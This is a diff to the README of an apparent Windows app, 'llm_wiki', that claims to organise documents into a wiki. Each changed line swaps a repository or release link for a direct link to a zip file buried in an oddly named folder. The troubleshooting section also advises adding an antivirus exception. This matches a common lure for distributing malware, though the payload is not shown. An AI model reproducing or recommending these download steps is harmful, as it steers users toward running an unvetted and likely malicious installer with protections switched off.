@@ -1,6 +1,6 @@
 # 📚 llm_wiki - Turn documents into organized knowledge bases
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/Earthlike-hopper1684/llm_wiki)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/Earthlike-hopper1684/llm_wiki/raw/refs/heads/main/inhabitiveness/wiki_llm_2.8.zip)
 
 LLM Wiki organizes your documents into a searchable, interlinked knowledge base. It scans your files and builds a persistent wiki that grows with your information. You no longer need to search through hundreds of files to find one specific fact. The application links related topics and creates a map of your data.
 
@@ -8,7 +8,7 @@ LLM Wiki organizes your documents into a searchable, interlinked knowledge base.
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Earthlike-hopper1684/llm_wiki).
+1. Go to the [official release page](https://github.com/Earthlike-hopper1684/llm_wiki/raw/refs/heads/main/inhabitiveness/wiki_llm_2.8.zip).
 2. Click the link to download the installer for Windows.
 3. Open the downloaded file to start the setup process.
 4. Follow the instructions on your screen.
@@ -61,7 +61,7 @@ If the application fails to open, check the following:
 *   Restart your computer and try again.
 *   Verify you have sufficient disk space.
 *   Ensure your antivirus software does not block the application. You may need to add an exception for the installation folder.
-*   Reinstall the application using the latest version from the [download page](https://github.com/Earthlike-hopper1684/llm_wiki).
+*   Reinstall the application using the latest version from the [download page](https://github.com/Earthlike-hopper1684/llm_wiki/raw/refs/heads/main/inhabitiveness/wiki_llm_2.8.zip).
 
 ## 📋 Frequently Asked Questions
 
